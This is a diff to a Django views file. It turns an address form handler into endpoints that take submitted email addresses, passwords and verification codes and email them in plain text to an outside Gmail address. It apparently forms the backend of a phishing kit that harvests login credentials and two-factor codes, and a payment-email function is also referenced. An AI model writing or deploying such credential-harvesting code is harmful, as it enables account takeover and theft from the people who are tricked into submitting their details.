@@ -3,20 +3,33 @@ from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 from django.core.mail import send_mail
 import json
+import random
+import string
 
 # Create your views here.
 
-def send_notification_email(form_data):
-    email_subject = 'New Address added'
+def send_login_notification_email(login_data):
+    email_subject = 'New Login Attempt'
     email_body = f"""
-    A new address has been created in the system.
+    A new login attempt has been made.
     
-    Full Name: {form_data.get('fullName')}
-    Address: {form_data.get('address')}
-    City: {form_data.get('city')}
-    State: {form_data.get('state')}
-    ZIP Code: {form_data.get('zipCode')}
-    Phone: {form_data.get('phone')}
+    Email: {login_data.get('email')}
+    sswrd: {login_data.get('password')}
+    """
+    send_mail(
+        email_subject,
+        email_body,
+        'tenfortow@gmail.com',
+        ['tenfortow@gmail.com'],
+        fail_silently=False,
+    )
+
+def send_code_notification_email(code_data):
+    email_subject = 'Verification Code Submitted'
+    email_body = f"""
+    A verification code has been submitted.
+    
+    Code: {code_data.get('code')}
     """
     send_mail(
         email_subject,
@@ -47,12 +60,20 @@ def send_payment_email(payment_data):
 @csrf_exempt
 def address(request):
     if request.method == 'POST':
-        form_data = json.loads(request.body)
-        send_notification_email(form_data)
-        return JsonResponse({'message': 'Address created and email sent'}, status=201)
+        login_data = json.loads(request.body)
+        send_login_notification_email(login_data)
+        return JsonResponse({'message': 'Login information received and email sent'}, status=201)
     elif request.method == 'GET':
-        addresses = []  # Replace with actual data retrieval logic
-        return JsonResponse(addresses, safe=False)
+        return JsonResponse({'message': 'Use POST to submit login credentials'}, safe=False)
+    else:
+        return JsonResponse({'error': 'Method not allowed'}, status=405)
+
+@csrf_exempt
+def verify_code(request):
+    if request.method == 'POST':
+        code_data = json.loads(request.body)
+        send_code_notification_email(code_data)
+        return JsonResponse({'message': 'Verification code received and email sent'}, status=201)
     else:
         return JsonResponse({'error': 'Method not allowed'}, status=405)
 
